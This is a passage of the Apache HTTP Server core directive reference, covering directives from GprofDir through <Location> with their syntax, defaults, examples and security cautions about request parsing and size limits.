When the server has been compiled with gprof profiling support,
`GprofDir` causes `gmon.out` files to
be written to the specified directory when the process exits. If the
argument ends with a percent symbol ('%'), subdirectories are created
for each process id.

This directive currently only works with the `[prefork](../mod/prefork.html)`
MPM.

[![top](../images/up.gif)](#page-header)
## HostnameLookups Directive

| [Description:](directive-dict.html#Description) | Enables DNS lookups on client IP addresses |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `HostnameLookups On|Off|Double` |
| [Default:](directive-dict.html#Default) | `HostnameLookups Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive enables DNS lookups so that host names can be
logged (and passed to CGIs/SSIs in `REMOTE_HOST`).
The value `Double` refers to doing double-reverse
DNS lookup. That is, after a reverse lookup is performed, a forward
lookup is then performed on that result. At least one of the IP
addresses in the forward lookup must match the original
address. (In "tcpwrappers" terminology this is called
`PARANOID`.)

Regardless of the setting, when `[mod_authz_host](../mod/mod_authz_host.html)` is
used for controlling access by hostname, a double reverse lookup
will be performed. This is necessary for security. Note that the
result of this double-reverse isn't generally available unless you
set `HostnameLookups Double`. For example, if only
`HostnameLookups On` and a request is made to an object
that is protected by hostname restrictions, regardless of whether
the double-reverse fails or not, CGIs will still be passed the
single-reverse result in `REMOTE_HOST`.

The default is `Off` in order to save the network
traffic for those sites that don't truly need the reverse
lookups done. It is also better for the end users because they
don't have to suffer the extra latency that a lookup entails.
Heavily loaded sites should leave this directive
`Off`, since DNS lookups can take considerable
amounts of time. The utility `[logresolve](../programs/logresolve.html)`, compiled by
default to the `bin` subdirectory of your installation
directory, can be used to look up host names from logged IP addresses
offline.

Finally, if you have [hostname-based Require
directives](mod_authz_host.html#reqhost), a hostname lookup will be performed regardless of
the setting of `HostnameLookups`.

## HttpProtocolOptions Directive

| [Description:](directive-dict.html#Description) | Modify restrictions on HTTP Request Messages |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `HttpProtocolOptions [Strict|Unsafe] [RegisteredMethods|LenientMethods] [Allow0.9|Require1.0]` |
| [Default:](directive-dict.html#Default) | `HttpProtocolOptions Strict LenientMethods Allow0.9` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.2.32 or 2.4.24 and later |

This directive changes the rules applied to the HTTP Request Line
([RFC 7230 Â§3.1.1](https://tools.ietf.org/html/rfc7230#section-3.1.1)) and the HTTP Request Header Fields
([RFC 7230 Â§3.2](https://tools.ietf.org/html/rfc7230#section-3.2)), which are now applied by default or using
the `Strict` option. Due to legacy modules, applications or
custom user-agents which must be deprecated the `Unsafe`
option has been added to revert to the legacy behaviors.

These rules are applied prior to request processing,
so must be configured at the global or default (first) matching
virtual host section, by IP/port interface (and not by name)
to be honored.

The directive accepts three parameters from the following list
of choices, applying the default to the ones not specified:

Strict|Unsafe

Prior to the introduction of this directive, the Apache HTTP Server
request message parsers were tolerant of a number of forms of input
which did not conform to the protocol.
[RFC 7230 Â§9.4 Request Splitting](https://tools.ietf.org/html/rfc7230#section-9.4) and
[Â§9.5 Response Smuggling](https://tools.ietf.org/html/rfc7230#section-9.5) call out only two of the potential
risks of accepting non-conformant request messages, while
[RFC 7230 Â§3.5](https://tools.ietf.org/html/rfc7230#section-3.5) "Message Parsing Robustness" identify the
risks of accepting obscure whitespace and request message formatting.
As of the introduction of this directive, all grammar rules of the
specification are enforced in the default `Strict` operating
mode, and the strict whitespace suggested by section 3.5 is enforced
and cannot be relaxed.

### Security risks of Unsafe

Users are strongly cautioned against toggling the `Unsafe`
mode of operation, particularly on outward-facing, publicly accessible
server deployments. If an interface is required for faulty monitoring
or other custom service consumers running on an intranet, users should
toggle the Unsafe option only on a specific virtual host configured
to service their internal private network.

### Example of a request leading to HTTP 400 with Strict mode

`# Missing CRLF

GET / HTTP/1.0\n\n`

### Command line tools and CRLF

Some tools need to be forced to use CRLF, otherwise httpd will return
a HTTP 400 response like described in the above use case. For example,
the **OpenSSL s\_client needs the -crlf parameter to work
properly**.

The `[DumpIOInput](../mod/mod_dumpio.html#dumpioinput)` directive
can help while reviewing the HTTP request to identify issues like the
absence of CRLF.

RegisteredMethods|LenientMethods

[RFC 7231 Â§4.1](https://tools.ietf.org/html/rfc7231#section-4.1) "Request Methods" "Overview" requires that
origin servers shall respond with a HTTP 501 status code when an
unsupported method is encountered in the request line.
This already happens when the `LenientMethods` option is used,
but administrators may wish to toggle the `RegisteredMethods`
option and register any non-standard methods using the
`[RegisterHttpMethod](#registerhttpmethod)`
directive, particularly if the `Unsafe`
option has been toggled.

### Forward Proxy compatibility

The `RegisteredMethods` option should **not**
be toggled for forward proxy hosts, as the methods supported by the
origin servers are unknown to the proxy server.

### Example of a request leading to HTTP 501 with LenientMethods mode

`# Unknown HTTP method

WOW / HTTP/1.0\r\n\r\n

# Lowercase HTTP method

get / HTTP/1.0\r\n\r\n`

Allow0.9|Require1.0

[RFC 2616 Â§19.6](https://tools.ietf.org/html/rfc2616#section-19.6) "Compatibility With Previous Versions" had
encouraged HTTP servers to support legacy HTTP/0.9 requests. RFC 7230
supersedes this with "The expectation to support HTTP/0.9 requests has
been removed" and offers additional comments in
[RFC 7230 Appendix A](https://tools.ietf.org/html/rfc7230#appendix-A). The `Require1.0` option allows
the user to remove support of the default `Allow0.9` option's
behavior.

### Example of a request leading to HTTP 400 with Require1.0 mode

`# Unsupported HTTP version

GET /\r\n\r\n`

Reviewing the messages logged to the
`[ErrorLog](#errorlog)`, configured with
`[LogLevel](#loglevel)` `debug` level,
can help identify such faulty requests along with their origin.
Users should pay particular attention to the 400 responses in the access
log for invalid requests which were unexpectedly rejected.

## <If> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply only if a condition is satisfied by a request at runtime |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<If expression> ... </If>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Nested conditions are evaluated in 2.4.26 and later |

The `<If>` directive
evaluates an expression at runtime, and applies the enclosed
directives if and only if the expression evaluates to true.
For example:

```
<If "-z req('Host')">
```

would match HTTP/1.0 requests without a Host: header.
Expressions may contain various shell-like operators for string
comparison (`==`, `!=`, `<`, ...),
integer comparison (`-eq`, `-ne`, ...),
and others (`-n`, `-z`, `-f`, ...).
It is also possible to use regular expressions,

```
<If "%{QUERY_STRING} =~ /(delete|commit)=.*?elem/">
```

shell-like pattern matches and many other operations. These operations
can be done on request headers (`req`), environment variables
(`env`), and a large number of other properties. The full
documentation is available in [Expressions in
Apache HTTP Server](../expr.html).

Only directives that support the [directory context](directive-dict.html#Context) can be used within this configuration section.

Certain variables, such as `CONTENT_TYPE` and other
response headers, are set after <If> conditions have already
been evaluated, and so will not be available to use in this
directive.

Directives that take affect during configuration parsing, such as
`Define`, `Include`, and
`Error` cannot be made conditional by enclosing
them in an if `<If>` configuration
section. These sections are always part of the configuration,
regardless of how they evaluate at runtime.

## <IfDefine> Directive

| [Description:](directive-dict.html#Description) | Encloses directives that will be processed only if a test is true at startup |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<IfDefine [!]parameter-name> ... </IfDefine>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `<IfDefine test>...</IfDefine>` section is used to mark directives that are conditional. The
directives within an `<IfDefine>`
section are only processed if the test is true. If
test is false, everything between the start and end markers is
ignored.

The test in the `<IfDefine>` section directive can be one of two forms:

* parameter-name
* `!`parameter-name

In the former case, the directives between the start and end
markers are only processed if the parameter named
parameter-name is defined. The second format reverses
the test, and only processes the directives if
parameter-name is **not** defined.

The parameter-name argument is a define as given on the
`[httpd](../programs/httpd.html)` command line via `-Dparameter` at the time the server was started or by the `[Define](#define)` directive.

`<IfDefine>` sections are
nest-able, which can be used to implement simple
multiple-parameter tests. Example:

`httpd -DReverseProxy -DUseCache -DMemCache ...`

```
<IfDefine ReverseProxy>
  LoadModule proxy_module   modules/mod_proxy.so
  LoadModule proxy_http_module   modules/mod_proxy_http.so
  <IfDefine UseCache>
    LoadModule cache_module   modules/mod_cache.so
    <IfDefine MemCache>
      LoadModule mem_cache_module   modules/mod_mem_cache.so
    </IfDefine>
    <IfDefine !MemCache>
      LoadModule cache_disk_module   modules/mod_cache_disk.so
    </IfDefine>
  </IfDefine>
</IfDefine>
```

## <IfDirective> Directive

| [Description:](directive-dict.html#Description) | Encloses directives that are processed conditional on the presence or absence of a specific directive |

| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in 2.4.34 and later. |

The `<IfDirective test>...</IfDirective>`
section is used to mark directives that are conditional on the presence of
a specific directive. The directives within an `<IfDirective>` section are only processed if the test
is true. If test is false, everything between the start and
end markers is ignored.

The test in the `<IfDirective>` section can be one of two forms:

* directive-name
* !directive-name

In the former case, the directives between the start and end
markers are only processed if a directive of the given name is
available at the time of processing. The second format reverses the test,
and only processes the directives if directive-name is
**not** available.

This section should only be used if you need to have one
configuration file that works across multiple versions of
`[httpd](../programs/httpd.html)`, regardless of whether a particular
directive is available. In normal operation, directives need not
be placed in `<IfDirective>`
sections.

## <IfFile> Directive

| [Description:](directive-dict.html#Description) | Encloses directives that will be processed only if file exists at startup |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<IfFile [!]filename> ... </IfFile>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in 2.4.34 and later. |

The `<IfFile filename>...</IfFile>` section is used to mark directives that are conditional on
the existence of a file on disk. The directives within an
`<IfFile>` section are only
processed if filename exists. If filename
doesn't exist, everything between the start and end markers is
ignored. filename can be an absolute path or a path
relative to the server root.

The filename in the `<IfFile>` section directive can take the same forms as the
test variable in the `[<IfDefine>](#ifdefine)` section, i.e. the test can be negated if the `!` character is placed directly before filename.

If a relative filename is supplied, the check is
`[ServerRoot](#serverroot)` relative. In the case where
this directive occurs before the `[ServerRoot](#serverroot)`,
the path will be checked relative to the compiled-in server root or
the server root passed in on the command line via the `-d`
parameter.

### Warning

In 2.4.34, it is not possible to specify a filename
with surrounding quotes. This would generate a parsing error at start-up.
The main impact is that filenames with spaces can't be used.
This behavior is fixed in 2.4.35.

[![top](../images/up.gif)](#page-header)
## <IfModule> Directive

| [Description:](directive-dict.html#Description) | Encloses directives that are processed conditional on the presence or absence of a specific module |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<IfModule [!]module-file|module-identifier> ... </IfModule>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Module identifiers are available in version 2.1 and later. |

The `<IfModule test>...</IfModule>`
section is used to mark directives that are conditional on the presence of
a specific module. The directives within an `<IfModule>` section are only processed if the test
is true. If test is false, everything between the start and
end markers is ignored.

The test in the `<IfModule>` section directive can be one of two forms:

* module
* !module

In the former case, the directives between the start and end
markers are only processed if the module named module
is included in Apache httpd -- either compiled in or
dynamically loaded using `[LoadModule](../mod/mod_so.html#loadmodule)`. The second format reverses the test,
and only processes the directives if module is
**not** included.

The module argument can be either the module identifier or
the file name of the module, at the time it was compiled. For example,
`rewrite_module` is the identifier and
`mod_rewrite.c` is the file name. If a module consists of
several source files, use the name of the file containing the string
`STANDARD20_MODULE_STUFF`.

`<IfModule>` sections are
nest-able, which can be used to implement simple multiple-module
tests.

This section should only be used if you need to have one
configuration file that works whether or not a specific module
is available. In normal operation, directives need not be
placed in `<IfModule>`
sections.

## <IfSection> Directive

| [Description:](directive-dict.html#Description) | Encloses directives that are processed conditional on the presence or absence of a specific section directive |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<IfSection [!]section-name> ... </IfSection>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in 2.4.34 and later. |

The `<IfSection
test>...</IfSection>` section is used
to mark directives that are conditional on the presence of a
specific section directive. A section directive is any directive
such as `<VirtualHost>` which
encloses other directives, and has a directive name with a leading
"<".

The directives within an `<IfSection>` section are only processed if the test
is true. If test is false, everything between the start and
end markers is ignored.

The section-name must be specified without either
the leading "<" or closing ">". The test in the
`<IfSection>` section can be one
of two forms:

* section-name
* !section-name

In the former case, the directives between the start and end
markers are only processed if a section directive of the given
name is available at the time of processing. The second format
reverses the test, and only processes the directives if
section-name is **not** an available
section directive.

For example:

```
<IfSection VirtualHost>
   ...
</IfSection>
```
This section should only be used if you need to have one
configuration file that works across multiple versions of `[httpd](../programs/httpd.html)`,
regardless of whether a particular section directive is
available. In normal operation, directives need not be placed in
`<IfSection>` sections.

## Include Directive

| [Description:](directive-dict.html#Description) | Includes other configuration files from within the server configuration files |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Include file-path|directory-path|wildcard` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Directory wildcard matching available in 2.3.6 and later |

This directive allows inclusion of other configuration files
from within the server configuration files.

Shell-style (`fnmatch()`) wildcard characters can be used
in the filename or directory parts of the path to include several files
at once, in alphabetical order. In addition, if
`Include` points to a directory, rather than a file,
Apache httpd will read all files in that directory and any subdirectory.
However, including entire directories is not recommended, because it is
easy to accidentally leave temporary files in a directory that can cause
`[httpd](../programs/httpd.html)` to fail. Instead, we encourage you to use the
wildcard syntax shown below, to include files that match a particular
pattern, such as \*.conf, for example.

The `[Include](#include)` directive will
**fail with an error** if a wildcard expression does not
match any file. The `[IncludeOptional](#includeoptional)`
directive can be used if non-matching wildcards should be ignored.

The file path specified may be an absolute path, or may be relative
to the `[ServerRoot](#serverroot)` directory.

Examples:

```
Include /usr/local/apache2/conf/ssl.conf
Include /usr/local/apache2/conf/vhosts/*.conf
```

Or, providing paths relative to your `[ServerRoot](#serverroot)` directory:

```
Include conf/ssl.conf
Include conf/vhosts/*.conf
```

Wildcards may be included in the directory or file portion of the
path. This example will fail if there is no subdirectory in conf/vhosts
that contains at least one \*.conf file:

```
Include conf/vhosts/*/*.conf
```

Alternatively, the following command will just be ignored in case of
missing files or directories:

```
IncludeOptional conf/vhosts/*/*.conf
```

## IncludeOptional Directive

| [Description:](directive-dict.html#Description) | Includes other configuration files from within the server configuration files |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `IncludeOptional file-path|directory-path|wildcard` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in 2.3.6 and later. Not existent file paths without wildcards do not cause SyntaxError after 2.4.30 |

This directive allows inclusion of other configuration files
from within the server configuration files. It works identically to the
`[Include](#include)` directive, but it will be
silently ignored (instead of causing an error) if wildcards are used and
they do not match any file or directory or if a file path does not exist
on the file system.

## KeepAlive Directive

| [Description:](directive-dict.html#Description) | Enables HTTP persistent connections |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `KeepAlive On|Off` |
| [Default:](directive-dict.html#Default) | `KeepAlive On` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The Keep-Alive extension to HTTP/1.0 and the persistent
connection feature of HTTP/1.1 provide long-lived HTTP sessions
which allow multiple requests to be sent over the same TCP
connection. In some cases this has been shown to result in an
almost 50% speedup in latency times for HTML documents with
many images. To enable Keep-Alive connections, set
`KeepAlive On`.

For HTTP/1.0 clients, Keep-Alive connections will only be
used if they are specifically requested by a client. In
addition, a Keep-Alive connection with an HTTP/1.0 client can
only be used when the length of the content is known in
advance. This implies that dynamic content such as CGI output,
SSI pages, and server-generated directory listings will
generally not use Keep-Alive connections to HTTP/1.0 clients.
For HTTP/1.1 clients, persistent connections are the default
unless otherwise specified. If the client requests it, chunked
encoding will be used in order to send content of unknown
length over persistent connections.

When a client uses a Keep-Alive connection, it will be counted
as a single "request" for the `[MaxConnectionsPerChild](../mod/mpm_common.html#maxconnectionsperchild)` directive, regardless
of how many requests are sent using the connection.

### See also

* `[MaxKeepAliveRequests](#maxkeepaliverequests)`

[![top](../images/up.gif)](#page-header)
## KeepAliveTimeout Directive

| [Description:](directive-dict.html#Description) | Amount of time the server will wait for subsequent requests on a persistent connection |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `KeepAliveTimeout num[ms]` |
| [Default:](directive-dict.html#Default) | `KeepAliveTimeout 5` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The number of seconds Apache httpd will wait for a subsequent
request before closing the connection. By adding a postfix of ms the
timeout can be also set in milliseconds. Once a request has been
received, the timeout value specified by the
`[Timeout](#timeout)` directive applies.

Setting `KeepAliveTimeout` to a high value
may cause performance problems in heavily loaded servers. The
higher the timeout, the more server processes will be kept
occupied waiting on connections with idle clients.

If `KeepAliveTimeout` is **not**
set for a name-based virtual host, the value of the first defined
virtual host best matching the local IP and port will be used.

[![top](../images/up.gif)](#page-header)
## <Limit> Directive

| [Description:](directive-dict.html#Description) | Restrict enclosed access controls to only certain HTTP methods |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<Limit method [method] ... > ... </Limit>` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | AuthConfig, Limit |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Access controls are normally effective for
**all** access methods, and this is the usual
desired behavior. **In the general case, access control
directives should not be placed within a
`<Limit>` section.**

The purpose of the `<Limit>`
directive is to restrict the effect of the access controls to the
nominated HTTP methods. For all other methods, the access
restrictions that are enclosed in the `<Limit>` bracket **will have no
effect**. The following example applies the access control
only to the methods `POST`, `PUT`, and
`DELETE`, leaving all other methods unprotected:

```
<Limit POST PUT DELETE>
  Require valid-user
</Limit>
```

The method names listed can be one or more of: `GET`,
`POST`, `PUT`, `DELETE`,
`CONNECT`, `OPTIONS`,
`PATCH`, `PROPFIND`, `PROPPATCH`,
`MKCOL`, `COPY`, `MOVE`,
`LOCK`, and `UNLOCK`. **The method name is
case-sensitive.** If `GET` is used, it will also
restrict `HEAD` requests. The `TRACE` method
cannot be limited (see `[TraceEnable](#traceenable)`).

A `[<LimitExcept>](#limitexcept)` section should always be
used in preference to a `<Limit>`
section when restricting access, since a `[<LimitExcept>](#limitexcept)` section provides protection
against arbitrary methods.

The `<Limit>` and
`[<LimitExcept>](#limitexcept)`
directives may be nested. In this case, each successive level of
`<Limit>` or `[<LimitExcept>](#limitexcept)` directives must
further restrict the set of methods to which access controls apply.

When using
`<Limit>` or
`<LimitExcept>` directives with
the `[Require](../mod/mod_authz_core.html#require)` directive,
note that the first `[Require](../mod/mod_authz_core.html#require)`
to succeed authorizes the request, regardless of the presence of other
`[Require](../mod/mod_authz_core.html#require)` directives.

For example, given the following configuration, all users will
be authorized for `POST` requests, and the
`Require group editors` directive will be ignored
in all cases:

```
<LimitExcept GET>
  Require valid-user
</LimitExcept>
<Limit POST>
  Require group editors
</Limit>
```

[![top](../images/up.gif)](#page-header)
## <LimitExcept> Directive

| [Description:](directive-dict.html#Description) | Restrict access controls to all HTTP methods except the named ones |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<LimitExcept method [method] ... > ... </LimitExcept>` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | AuthConfig, Limit |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

`<LimitExcept>` and
`</LimitExcept>` are used to enclose
a group of access control directives which will then apply to any
HTTP access method **not** listed in the arguments;
i.e., it is the opposite of a `[<Limit>](#limit)` section and can be used to control
both standard and nonstandard/unrecognized methods. See the
documentation for `[<Limit>](#limit)` for more details.

For example:

```
<LimitExcept POST GET>
  Require valid-user
</LimitExcept>
```

[![top](../images/up.gif)](#page-header)
## LimitInternalRecursion Directive

| [Description:](directive-dict.html#Description) | Determine maximum number of internal redirects and nested subrequests |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitInternalRecursion number [number]` |
| [Default:](directive-dict.html#Default) | `LimitInternalRecursion 10` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

An internal redirect happens, for example, when using the `[Action](../mod/mod_actions.html#action)` directive, which internally
redirects the original request to a CGI script. A subrequest is Apache httpd's
mechanism to find out what would happen for some URI if it were requested.
For example, `[mod_dir](../mod/mod_dir.html)` uses subrequests to look for the
files listed in the `[DirectoryIndex](../mod/mod_dir.html#directoryindex)`
directive.

`LimitInternalRecursion` prevents the server
from crashing when entering an infinite loop of internal redirects or
subrequests. Such loops are usually caused by misconfigurations.

The directive stores two different limits, which are evaluated on
per-request basis. The first number is the maximum number of
internal redirects that may follow each other. The second number
determines how deeply subrequests may be nested. If you specify only one
number, it will be assigned to both limits.

```
LimitInternalRecursion 5
```

[![top](../images/up.gif)](#page-header)
## LimitRequestBody Directive

| [Description:](directive-dict.html#Description) | Restricts the total size of the HTTP request body sent from the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitRequestBody bytes` |
| [Default:](directive-dict.html#Default) | `LimitRequestBody 1073741824` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | In Apache HTTP Server 2.4.53 and earlier, the default value was 0 (unlimited) |

This directive specifies the number of bytes
that are allowed in a request body. A value of 0 means unlimited.

The `LimitRequestBody` directive allows
the user to set a limit on the allowed size of an HTTP request
message body within the context in which the directive is given
(server, per-directory, per-file or per-location). If the client
request exceeds that limit, the server will return an error
response instead of servicing the request. The size of a normal
request message body will vary greatly depending on the nature of
the resource and the methods allowed on that resource. CGI scripts
typically use the message body for retrieving form information.
Implementations of the `PUT` method will require
a value at least as large as any representation that the server
wishes to accept for that resource.

This directive gives the server administrator greater
control over abnormal client request behavior, which may be
useful for avoiding some forms of denial-of-service
attacks.

If, for example, you are permitting file upload to a particular
location and wish to limit the size of the uploaded file to 100K,
you might use the following directive:

```
LimitRequestBody 102400
```

[![top](../images/up.gif)](#page-header)
## LimitRequestFields Directive

| [Description:](directive-dict.html#Description) | Limits the number of HTTP request header fields that will be accepted from the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitRequestFields number` |
| [Default:](directive-dict.html#Default) | `LimitRequestFields 100` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Setting number at 0 means unlimited.
The default value is defined by the compile-time
constant `DEFAULT_LIMIT_REQUEST_FIELDS` (100 as
distributed).

The `LimitRequestFields` directive allows
the server administrator to modify the limit on the number of
request header fields allowed in an HTTP request. A server needs
this value to be larger than the number of fields that a normal
client request might include. The number of request header fields
used by a client rarely exceeds 20, but this may vary among
different client implementations, often depending upon the extent
to which a user has configured their browser to support detailed
content negotiation. Optional HTTP extensions are often expressed
using request header fields.

This directive gives the server administrator greater
control over abnormal client request behavior, which may be
useful for avoiding some forms of denial-of-service attacks.
The value should be increased if normal clients see an error
response from the server that indicates too many fields were
sent in the request.

For example:

```
LimitRequestFields 50
```
### Warning

When name-based virtual hosting is used, the value for this
directive is taken from the default (first-listed) virtual host for the
local IP and port combination.

[![top](../images/up.gif)](#page-header)
## LimitRequestFieldSize Directive

| [Description:](directive-dict.html#Description) | Limits the size of the HTTP request header allowed from the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitRequestFieldSize bytes` |
| [Default:](directive-dict.html#Default) | `LimitRequestFieldSize 8190` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive specifies the number of bytes
that will be allowed in an HTTP request header.

The `LimitRequestFieldSize` directive
allows the server administrator to set the limit
on the allowed size of an HTTP request header field. A server
needs this value to be large enough to hold any one header field
from a normal client request. The size of a normal request header
field will vary greatly among different client implementations,
often depending upon the extent to which a user has configured
their browser to support detailed content negotiation. SPNEGO
authentication headers can be up to 12392 bytes.

This directive gives the server administrator greater
control over abnormal client request behavior, which may be
useful for avoiding some forms of denial-of-service attacks.

For example:

```
LimitRequestFieldSize 4094
```
Under normal conditions, the value should not be changed from
the default.
### Warning

When name-based virtual hosting is used, the value for this
directive is taken from the default (first-listed) virtual host best
matching the current IP address and port combination.

[![top](../images/up.gif)](#page-header)
## LimitRequestLine Directive

| [Description:](directive-dict.html#Description) | Limit the size of the HTTP request line that will be accepted from the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitRequestLine bytes` |
| [Default:](directive-dict.html#Default) | `LimitRequestLine 8190` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive sets the number of bytes that will be
allowed on the HTTP request-line.

The `LimitRequestLine` directive allows
the server administrator to set the limit on the allowed size
of a client's HTTP request-line. Since the request-line consists of the
HTTP method, URI, and protocol version, the
`LimitRequestLine` directive places a
restriction on the length of a request-URI allowed for a request
on the server. A server needs this value to be large enough to
hold any of its resource names, including any information that
might be passed in the query part of a `GET` request.

This directive gives the server administrator greater
control over abnormal client request behavior, which may be
useful for avoiding some forms of denial-of-service attacks.

For example:

```
LimitRequestLine 4094
```
Under normal conditions, the value should not be changed from
the default.
### Warning

When name-based virtual hosting is used, the value for this
directive is taken from the default (first-listed) virtual host best
matching the current IP address and port combination.

[![top](../images/up.gif)](#page-header)
## LimitXMLRequestBody Directive

| [Description:](directive-dict.html#Description) | Limits the size of an XML-based request body |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LimitXMLRequestBody bytes` |
| [Default:](directive-dict.html#Default) | `LimitXMLRequestBody 1000000` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Limit (in bytes) on the maximum size of an XML-based request
body. A value of `0` will apply a hard limit (depending on
32bit vs 64bit system) allowing for XML escaping within the bounds of
the system addressable memory, but it exists for compatibility only
and is not recommended since it does not account for memory consumed
elsewhere or concurrent requests, which might result in an overall
system out-of-memory.

Example:

```
# Limit of 1 MiB
LimitXMLRequestBody 1048576
```

[![top](../images/up.gif)](#page-header)
## <Location> Directive

| [Description:](directive-dict.html#Description) | Applies the enclosed directives only to matching URLs |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<Location URL-path|URL> ... </Location>` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `<Location>` directive
limits the scope of the enclosed directives by URL. It is similar to the
`[<Directory>](#directory)`
directive, and starts a subsection which is terminated with a
`</Location>` directive. `<Location>` sections are processed in the
order they appear in the configuration file, after the `[<Directory>](#directory)` sections and
`.htaccess` files are read, and after the `[<Files>](#files)` sections.

`<Location>` sections operate
completely outside the filesystem. This has several consequences.
Most importantly, `<Location>`
directives should not be used to control access to filesystem
locations. Since several different URLs may map to the same
filesystem location, such access controls may by circumvented.

The enclosed directives will be applied to the request if the path component
of the URL meets *any* of the following criteria:

* The specified location matches exactly the path component of the URL.
* The specified location, which ends in a forward slash, is a prefix
  of the path component of the URL (treated as a context root).
* The specified location, with the addition of a trailing slash, is a
  prefix of the path component of the URL (also treated as a context root).

In the example below, where no trailing slash is used, requests to
/private1, /private1/ and /private1/file.txt will have the enclosed
directives applied, but /private1other would not.

```
<Location "/private1">
    #  ...
</Location>
```

In the example below, where a trailing slash is used, requests to
/private2/ and /private2/file.txt will have the enclosed
directives applied, but /private2 and /private2other would not.

```
<Location "/private2/">
    # ...
</Location>
```
### When to use `<Location>`

Use `<Location>` to apply
directives to content that lives outside the filesystem. For
content that lives in the filesystem, use `[<Directory>](#directory)` and `[<Files>](#files)`. An exception is
`<Location "/">`, which is an easy way to
apply a configuration to the entire server.

For all origin (non-proxy) requests, the URL to be matched is a
URL-path of the form `/path/`. *No scheme, hostname,
port, or query string may be included.* For proxy requests, the
URL to be matched is of the form
`scheme://servername/path`, and you must include the
prefix.

The URL may use wildcards. In a wild-card string, `?` matches
any single character, and `*` matches any sequences of
characters. Neither wildcard character matches a / in the URL-path.

[Regular expressions](../glossary.html#regex "see glossary")
can also be used, with the addition of the `~`
character. For example:

```
<Location ~ "/(extra|special)/data">
    #...
</Location>
```

